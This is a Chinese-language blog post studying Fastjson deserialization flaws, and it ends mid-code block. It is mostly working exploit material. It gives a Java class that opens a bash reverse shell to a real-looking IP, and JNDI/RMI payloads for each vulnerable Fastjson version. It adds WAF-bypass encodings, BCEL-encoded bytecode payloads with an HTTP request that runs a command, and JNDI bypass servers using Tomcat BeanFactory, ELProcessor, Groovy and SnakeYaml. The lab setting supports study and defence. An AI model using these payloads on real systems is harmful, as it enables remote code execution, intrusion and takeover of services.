title: Fastjson漏洞学习
author: bmth
tags:
  - fastjson
top_img: 'https://img-blog.csdnimg.cn/7385a0ed913a4d9687a8267171f6b2c8.png'
cover: 'https://img-blog.csdnimg.cn/7385a0ed913a4d9687a8267171f6b2c8.png'
categories:
  - java
date: 2022-04-11 18:53:09
---
![](https://img-blog.csdnimg.cn/7385a0ed913a4d9687a8267171f6b2c8.png)
fastjson 是阿里巴巴的开源 JSON 解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean

## 自我提问与回答
1. parse 和 parseObject的区别：
使用`JSON.parse(jsonString)`和`JSON.parseObject(jsonString, Target.class)`，两者调用链一致，前者会在 jsonString 中解析字符串获取 @type 指定的类，后者则会直接使用参数中的class
parse 会识别并调用目标类的 setter 方法及某些特定条件的 getter 方法，而 parseObject 由于多执行了 `JSON.toJSON(obj)`，所以在处理过程中会调用反序列化目标类的所有 setter 和 getter 方法

2. templatesImpl为什么鸡肋：
调用`parseObject()`方法时，需要加入`Feature.SupportNonPublicField`参数，不太现实

3. 不出网怎么利用：
使用到的是BCEL字节码然后使用classload进行加载
tomcat7使用的类是`org.apache.tomcat.dbcp.dbcp.BasicDataSource`
tomcat8版本以后名为`org.apache.tomcat.dbcp.dbcp2.BasicDataSource`

4. 高版本jdk bcel为什么失败：
在Java 8u251以后，bcel类被删除

5. 1.2.48之前版本通杀exp原理是什么：
借助缓存进行通杀，缓存在1.2.48被改为默认关闭
漏洞原理是通过java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测

6. 1.2.68绕过原理是什么：
利用 expectClass 绕过 `checkAutoType()` ，实际上也是为了绕过安全检查的思路的延伸。主要使用 `Throwable` 和 `AutoCloseable` 进行绕过

7. 对象引用：
从 fastjson 1.2.36开始，可以通过`$ref`指定被引用的属性
fastjson 默认提供对象引用功能，在传输的数据中出现相同的对象时，fastjson 默认开启引用检测将相同的对象写成引用的形式，对应如下：
>| **引用** 	| **描述**    |
>-------- | -----
>| `"$ref":".."` | 上一级 |
>| `"$ref":"@"` |  	当前对象，也就是自引用 |
>| `"$ref":"$"` | 根对象 |
>| `"$ref":"$.children.0"` | 基于路径的引用，相当于 root.getChildren().get(0) |


## 漏洞复现
需要使用工具：[https://github.com/mbechler/marshalsec](https://github.com/mbechler/marshalsec)
下载下来后 `mvn clean package -DskipTests` 编译即可
### [FastJson]1.2.24-rce
因为目标环境是Java 8u102，没有`com.sun.jndi.rmi.object.trustURLCodebase`的限制，我们可以使用`com.sun.rowset.JdbcRowSetImpl`的利用链，借助JNDI注入来执行命令
shell.java：
```java
import java.lang.Runtime;

public class shell {
    static {
        try {
            String[] commands = {"/bin/bash","-c","bash -i >& /dev/tcp/110.42.134.160/6666 0>&1"};
            Runtime.getRuntime().exec(commands);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
使用javac编译为class字节码文件，然后开启rmi服务
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://110.42.134.160:8000/#shell" 9999
```
![](https://img-blog.csdnimg.cn/fdba58e20251455092d8add1b0b1dd5d.png)
在shell.class的文件夹下开启web服务
```bash
python3 -m http.server
```
![](https://img-blog.csdnimg.cn/64fcf25c925347d98da332d99d2b8d7e.png)
最后发送Payload，得到反弹shell
```json
{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://110.42.134.160:9999/shell",
        "autoCommit":true
    }
}
```
![](https://img-blog.csdnimg.cn/357e355b5db64d6c861d324c84b2b73b.png)
参考：
[https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.24-rce](https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.24-rce)

### [FastJson]1.2.47-rce
此次漏洞利用的核心点是java.lang.class这个java的基础类，在fastjson 1.2.48以前的版本没有做该类做任何限制，加上代码的一些逻辑缺陷，造成黑名单以及autotype的绕过
Payload：
```json
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://evil.com:9999/Exploit",
        "autoCommit":true
    }
}
```
同理成功得到flag
![](https://img-blog.csdnimg.cn/598ed616f9124aca897a19bd68144479.png)
参考：[https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.47-rce](https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.47-rce)

## 各版本的Exp
影响版本：**fastjson<=1.2.24**
```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1399/Exploit", "autoCommit":true}
```
影响版本：**1.2.25 <= fastjson <= 1.2.41**
>前提：
autoTypeSupport属性为true才能使用。（fastjson>=1.2.25默认为false）
```json
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"rmi://127.0.0.1:1399/Exploit", "autoCommit":true}
```
影响版本：**1.2.25 <= fastjson <= 1.2.42**
>前提：
autoTypeSupport属性为true才能使用。（fastjson>=1.2.25默认为false）
```json
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://127.0.0.1:1399/Exploit", "autoCommit":true}
```
影响版本：**1.2.25 <= fastjson <= 1.2.43**
>前提：
autoTypeSupport属性为true才能使用。（fastjson>=1.2.25默认为false）
```json
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"ldap://127.0.0.1:1399/Exploit", "autoCommit":true}
```
影响版本：**1.2.25 <= fastjson <= 1.2.45**
>前提：
autoTypeSupport属性为true才能使用。（fastjson>=1.2.25默认为false）
```json
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://127.0.0.1:1399/Exploit"}}
```
影响版本：**1.2.25 <= fastjson <= 1.2.32 (未开启 AutoTypeSupport)**
影响版本：**1.2.33 <= fastjson <= 1.2.47**
```json
{
    "a": {
        "@type": "java.lang.Class", 
        "val": "com.sun.rowset.JdbcRowSetImpl"
    }, 
    "b": {
        "@type": "com.sun.rowset.JdbcRowSetImpl", 
        "dataSourceName": "ldap://127.0.0.1:1399/Exploit", 
        "autoCommit": true
    }
}
```
影响版本：**fastjson<=1.2.68**
>前提：
利用类必须是expectClass类的子类或实现类，并且不在黑名单中
```json
{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://127.0.0.1:1399/Exploit"}
{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://127.0.0.1:1399/Exploit"}
{"@type":"com.caucho.config.types.ResourceRef","lookupName": "ldap://127.0.0.1:1399/Exploit", "value": {"$ref":"$.value"}}
```

### Fastjson WAF 绕过
Fastjson默认会去除键、值外的空格、\b、\n、\r、\f等，同时还会自动将键与值进行unicode与十六进制解码
1、unicode编码
```json
{"b":{"\u0040\u0074\u0079\u0070\u0065":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c","\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065":"ldap://127.0.0.1:9999","autoCommit":true}}
```
2、\x 16进制编码
```json
{"@\x74ype":"org.apache.commons.configuration.JNDIConfiguration","prefix":"rmi://127.0.0.1:9999"}
```
3、\b
```json
{"@type"\b:"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:9999","autoCommit":true}
```
4、/**/
```json
{"@type":/**/"Lcom.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:9999","autoCommit":true}
```

[浅谈fastjson waf Bypass思路](https://www.sec-in.com/article/950)
### 获取精确版本号
```
[{"a":"a\x]
{"@type":"java.lang.AutoCloseable"
a
```

[fastjson 获取精确版本号的方法](https://b1ue.cn/archives/402.html)
参考：

[红队武器库:fastjson小于1.2.68全漏洞RCE利用exp](https://zeo.cool/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/)
[fastjson：我一路向北，离开有你的季节 ](https://su18.org/post/fastjson)
[Fastjson姿势技巧集合](https://github.com/safe6Sec/Fastjson)

## Fastjson内网利用
在环境不出网的情况下，fastjson很难得以利用，这里学习一下使用动态加载类实现回显
需要注意在Java 8u251以后，bcel类被删除
### 代码分析
在tomcat中的`com.sun.org.apache.bcel.internal.util.ClassLoader`loadclass方法内，它会直接从 class_name 中提取 Class 的 bytecode 数据
![](https://img-blog.csdnimg.cn/85e46345f33b4b9c847fd03963f070a0.png)
判断是否为`$$BCEL$$`，是的话则调用createClass方法，否则调用modifyClass方法返回一个class，modifyClass方法则是调用自带的classloader来加载
![](https://img-blog.csdnimg.cn/323fd91ec42940968aaad452a93c7423.png)
截取`$$BCEL$$`字节后面的内容然后进行解密，解密为class字节码，最后调用defineClass进行加载字节码

于是我们通过FastJson反序列化，反序列化生成一个 `org.apache.tomcat.dbcp.dbcp2.BasicDataSource`对象，并将它的成员变量 classloader 赋值为`com.sun.org.apache.bcel.internal.util.ClassLoader`对象，将 classname 赋值为 经过BCEL编码的字节码（假设对应的类为Evil.class），我们将需要执行的代码写在 Evil.class 的 static 代码块中即可
### 利用
添加tomcat依赖
```
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-dbcp</artifactId>
    <version>9.0.8</version>
</dependency>
```
首先编写一个Exploit类
```java
import java.lang.Runtime;

public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
使用POC
```java
package exp;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
class bcel {
    public static void main(String[] argv) throws Exception{
        JavaClass cls = Repository.lookupClass(Exploit.class);
        String code = Utility.encode(cls.getBytes(), true);//转换为字节码并编码为bcel字节码

        String poc = "{\n" +
                "    {\n" +
                "        \"aaa\": {\n" +
                "                \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "                \"driverClassLoader\": {\n" +
                "                    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "                },\n" +
                "                \"driverClassName\": \"$$BCEL$$"+ code+ "\"\n" +
                "        }\n" +
                "    }: \"bbb\"\n" +
                "}";
        System.out.println(poc);
        JSON.parse(poc);
    }
}
```
![](https://img-blog.csdnimg.cn/23b357a9659b4fc0a92ff1091eb5feff.png)
那么将我们的Exploit类改为tomcat回显类，就可以产生回显了
在本地搭建一个环境，然后使用exp：
```
POST /hello HTTP/1.1
Host: 127.0.0.1:8080
cmd: whoami
Content-Type: application/x-www-form-urlencoded
Content-Length: 3334

code=
{
    {
        "@type": "com.alibaba.fastjson.JSONObject",
        "x":{
                "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A"
        }
    }: "x"
}
```
![](https://img-blog.csdnimg.cn/1a561226942f4e9aa9371ec5c1b6569c.png)
成功得到回显
1.2.47 becl的利用：
```json
{
    "name":
    {
        "@type" : "java.lang.Class",
        "val"   : "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"
    },
    "x" : {
        "name": {
            "@type" : "java.lang.Class",
            "val"   : "com.sun.org.apache.bcel.internal.util.ClassLoader"
        },
        "y": {
            "@type":"com.alibaba.fastjson.JSONObject",
            "c": {
                "@type":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type" : "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName":"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$d9w$TU$Y$ff$dd6$c9L$t$D$a5$v$F$c2$o$3b$a4$85$s$e2$K$z$60K$L$U$9b$W$q$F$y$Fu$3a$b9m$G$92$9903$a1$F$f7$5dq$c3$NE$c5$N$b5$ea$h$_$a1G$85$e3$b3$3ey$7c$e0O$f0$i$cf$f1$d5$t$8e$f8$dd$cc$c4$s4$a8y$f8$eew$bf$7d$bd$93$9f$fe$fa$ee$w$80$bb$f0$ad$82$G$ecW$90$c2$90$A$Hd$iTp$I$P$ca$Y$96pX$81$84$R$JG$U$i$c5C2$k$96$f1$88$MM$c6$a8$8cn$c1$d3e$a4e$ec$90$c0$85$c4$98$8c$5e$Z$e3$K20$U4$e3$98$8c$e3$e2$cc$ca$c8$c90$Fj$c9$c8$cb8$n$c3$96$e1$I$d7$ae$8c$82$84$93$K$s0$v$c0$v$F$a7$f1$a8$825xL$c6$e3$e2$7cB$80$te$3c$r$e3i$J$cfHx$96$n$b4$d50$Nw$3bC$7d$ac$f5$mC$a0$c7Js$86$c6$a4a$f2$c1Bn$94$dbC$dah$96$u$91$a4$a5k$d9$83$9am$88$bbO$M$b8$Z$c3ahI$f2$c9$7cbT$e7$d9D$wo$h$e6$f8N$3dcu2$c8$5b$f5$aco$9d$e9$MM$c9c$daI$z$91$d5$cc$f1DOVs$i$Sa9$86$c5$Vt$9b$8fe$b9$ee$s$G$b8$9b$b1$d2B$c0$S$beg$E$f6$8e$k$p$3e1$ear$9b$u$A$9b$3by$8a$dd$e6$t$Y$g$c6$b9$7b$c86$5cn$7bx$l$d7$d2$C$PM$f8$c4z$3d$97$ae$b6$96rE$b8$oT$dd$ca$e543M$d94$8f$d4$S$I$eb$Z$cdv$b8$3b$a8$e5$u$f19$vW$d3$8f$Ph$f9R$n$a8$bd$S$9e$a3$e6R$f7$q$ec$a6$d22$u$v$ab$60$eb$7c$97$n$ea$d48S$96$b8$b0$ad$e2vl$92$f0$bc$8a$X$f0$a2$8a$97$f02$c3V$cb$k$8f$3b$r$b91$9b$9cLX$f6$f1$f8$E$l$8d$eb$96$e9$f2I7N9$W$b8$e3$c6$f7$7bg$8fG$ee$b3$b2$94$a4$843$w$5e$c1$ab$M$f3$vq_$a2$db$a5$e0G$L$$$a7$a4$go$w$bd$8a$d7$f0$3a$c3$bc$9b$LKy$a8x$Dg$Z$ba$feo$3c$vn$9f$cc$d6t$g$$$c5$e2$e4$z$d3$a1$o$u3$911$y$T$8e$t$e3$8e$a7$3bc$c3$TV$f1$a6$88nm$b5P$c6u$f3$f1$3e$C$d5$k$ab$b2$f0$fa$a5$e2$z$bc$cd$mYN$dc$a4$d0$r$bc$a3$e2$5d$9cS$f1$k$de$X$f3$60$98ikB$c5y$7c$40C$b1$7bG$3fC$f0$c0$d0$ae$f6$cd$w$3e$U$C$f5$87$f6$M$d2$80$rhf$a5$c4$a8a$s$9c$M$5d$dbu$V$l$e1$C$d1DQ$dc$acI$T$5dr$5cp$N$g$7c$5d3M$d1$88$8fU$7c$82OU$7c$86$cf$r$5cT$f1$F$be$U$ed$fe$8a$y$i$e9V1$85$afU$7c$p$bc$E$c7$b2$Fa8$a8g$zQ$9f$e6$99$yvN$ea$3c$ef$g$W$b9h$ae$b1Z$M$8bn$b51U$c5$Y$ca$d8$b4$C4$adz$c1$b6$b9$e9$96$ef$f3c$ad$c9$9b$a5h$c4$5b$a8A$feT$95f$qiy$fb$T$ad$S$af$60$J$9d$9a$M$da$bf$y$n$r$K$b516$7b$a1fY$ec$f4v$b6$9cEW$N$9d$91Y$3a$ad$ff$f6r$84$M$f3$a4u$9c$K$bb$r6$fb$fd$Y$99Mj$ad$f5$ca4QL$bd$5c$cfj6O$97c$9bC$cf$40$b7$aes$c71$bcW0vX$3c$9d$95Sx$caqy$ce$5b$80$7d$b6$95$e7$b6$7b$8aa$dd$7f$d4a$e6$adq$ad$a45$c1$ed$kM$ccEu$b7$w_$y$d3$d5$M$93$K$bc$a4$d2p$P$bdS$v$b1$Z$a6$ce$3b$5b$P$97$ac$j$c8$e7$cb$d6d$d1d$af$_$cd$b3$fb$daY$9e$e9$Si$7f$c1t$8d$5cyu$cb$97$96$w5$9fL$8a$B$3e$c9icb$b1$g$efg$a5$G$VD$d4$ae$da$95Od$98K$ae$f6$98$f9$82K$9a$5c$a3$g$$$y$bb3$acD$F$83$d4$dbb5$Z5$bcSw$d4$82$c3$7by$d6$c8y$9f$82$f5$b7$eeE$e5$3a$8b$b4L$da$H$acD$82$3e$b1$e2W$H$s$5eo$82w$d0$zA$t$a33$d8v$Z$ecR$89$7d$t$c1$90G$a4$7f$F$80$ea$e3w$e3$k$3ae$dc$5bV$ae$fb$99L$aa$A$3b5$8d$ba$o$ea$p$81$o$82$fdm$91P$fd$VHE$c8$c9$N$8c$b0$86$o$94$B_$m$ec$J$a8e$81$b6$c8$i$l$j$dc$b0$d1$97$ed$I$b4$ff$83$G$7d$bd$b9$a4$Xi$f4D$e7u$84$7cj$93$a0F$CD$j$ae$8f4$a7$EK$8aJ$U$c4$fch$c8$83$d1$40$d9$92$i$95$a2A$Sm$m$d1$W$SU$7eDsGC$e8$KA$r$b2$60$g$L$8bX$U$89$W$b1$f8$3c$e4$c8$92$v2$bc$b4$p$ec3$96En$x1$oQE$uG$95$40dyj$K$8d$e2$ba$a2t$5dI0$YmHE$e5$oVEVW$86$U$95$3d$af$dfc$cd$f04$d6F$95$o$d6$V$b1$3e$g$be$8cX$a4$b5$88$b6$o6$88x$Oy$ba$h$fd$q$a3$b2$l$b9Oo$9fE$9fB$a0$ff$92h$Ns$d9$E$e2$a8$_5$ce$c6$d2R$93Tj$cdB$u$d4$f70$da$e9$b6$Zs$d0$83$b9$YD$p$861$P$W$9ap$G$R$9c$a5$7fb$e70$l$X$d1$82i$y$c0U$d2$ba$86E$f8$NQ$fc$81$c5$f8$93$ec$5d$c72V$87$e5L$c6$K$d6$8b$95$ec$IV1$Xk$c9$ebj6$89$f5$a5$n9M$3eT$96$n$3f$5b$e8$b6$90$jE$H$3a$v$ba$95$y$85$ad$d8Fc$d5$c36a$3b$d1$ea1$c8$d6$e1$3e$a2$F0$cc$96$a0$8b$b0$m$y$WD7qC$U$d5$ef$d8A$Y$7d$7c$f0$L$c5$bc$8d$b2$99$c6$P$e8$c5N$ca$e9$w$8a$d8$85$dd$94$d95$5c$40$l$d1$c2$d8C$k$bb$Q$ba$81_$R$96p$bf$84$7e$J$c92$f4$Q$P$l$90$u$7ft$Tr$j$x$I$86o$c0$r$5d$sa$_A$ec$x$8d$ff$D$7f$D$90$b6$bdL$R$L$A$A",
                "$ref": "$.x.y.c.connection"
            }
        }
    }
}
```

[Java动态类加载，当FastJson遇到内网](https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html)
[Java安全之Fastjson内网利用 ](https://www.cnblogs.com/nice0e3/p/14949148.html)
[利用Fastjson注入Spring内存马](https://xz.aliyun.com/t/10467)

## 高版本jdk的JNDI利用方法
基于RMI利用的JDK版本<=6u132, 7u122, 8u113，基于LDAP利用的JDK版本<=6u211、7u201、8u191、11.0.1
在高版本JDK中，对RMI和LDAP的`trustURLCodebase`都做了限制，从默认允许远程加载ObjectFactory变成了不允许


所以修复后的JDK版本无法在不修改`trustURLCodebase`的情况下通过远程加载ObjectFactory类的方式去执行Java代码

两种绕过方法如下：
1. 找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令
2. 利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行

这两种方式都非常依赖受害者本地CLASSPATH中环境，需要利用受害者本地的Gadget进行攻击

### 基于BeanFactory
在Tomcat的catalina.jar中有一个`org.apache.naming.factory.BeanFactory` 类，这个类的getObjectInstance() 会通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值。而该Bean Class的类名、属性、属性值，全都来自于Reference对象，均是攻击者可控的
>Tips: 根据beanFactory的代码逻辑，要求传入的Reference为ResourceRef类

![](https://img-blog.csdnimg.cn/627096cc686e4b8587c656aca6586125.png)
在`BeanFactory#getObjectInstance()`方法的逻辑里，可以根据Reference的forceString属性，来强制将bean对象某个属性的setter方法名指定为非setXXX()。举个例子，假设攻击者将Reference的forceString属性设置为x=eval，那么bean对象的x属性的setter方法名就会变成eval

要想实现执行恶意代码的目的，我们需要找到一个Java bean：
- 该类必须有无参构造方法
- 有public的setter方法且参数为一个String类型

#### ELProcessor
同样也是Tomcat环境下的`javax.el.ELProcessor`类就符合上述要求，关键`ELProcessor#eval(String)`方法可以把传入的字符串作为Java EL表达式去执行

server端代码如下：
```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class TomcatBeanFactoryServer {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        // 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory
        ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        // 强制将 'x' 属性的setter 从 'setX' 变为 'eval'
        resourceRef.add(new StringRefAddr("forceString", "a=eval"));
        // 利用表达式执行命令
        resourceRef.add(new StringRefAddr("a", "Runtime.getRuntime().exec(\"calc\")"));
//        resourceRef.add(new StringRefAddr("a", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd','/c','calc']).start()\")"));

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);
        registry.bind("el", referenceWrapper);
        System.out.println("rmi://127.0.0.1:1099/el");
    }
}
```
#### GroovyClassLoader
依赖：
```
<dependency>
    <groupId>org.codehaus.groovy</groupId>
    <artifactId>groovy-all</artifactId>
    <version>2.4.9</version>
</dependency>
```
`@ASTTest`是一种特殊的AST转换，它会在编译期对AST执行断言，而不是对编译结果执行断言，这意味着此AST转换在生成字节码之前可以访问 AST，`@ASTTest`可以放置在任何可注释节点上
那么我们可以借助BeanFactory的功能，使程序执行`GroovyClassLoader#parseClass`，然后去解析groovy脚本
```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class GroovyShellServer {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=parseClass"));
        String script = String.format("@groovy.transform.ASTTest(value={\nassert java.lang.Runtime.getRuntime().exec(\"%s\")\n})\ndef x\n", "calc");
        ref.add(new StringRefAddr("x",script));

        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("evilGroovy", referenceWrapper);
        System.out.println("rmi://127.0.0.1:1099/evilGroovy");
    }
}
```
#### SnakeYaml
依赖库使用SnakeYaml比Groovy更常见，`new org.yaml.snakeyaml.Yaml().load(String)`也刚好符合条件
依赖：
```
<dependency>
    <groupId>org.yaml</groupId>
    <artifactId>snakeyaml</artifactId>
    <version>1.27</version>
</dependency>
```
[Java安全之SnakeYaml反序列化分析](https://www.cnblogs.com/nice0e3/p/14514882.html)
Yaml是做反序列化的，当然也可以实现RCE，通过其反序列化过程即可实现
Exp：[https://github.com/artsploit/yaml-payload/](https://github.com/artsploit/yaml-payload/)
```bash
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
```
将项目打包后挂载到web端
![](https://img-blog.csdnimg.cn/d8688ea3dfa646cfbea9c40e80231e0c.png)
```java
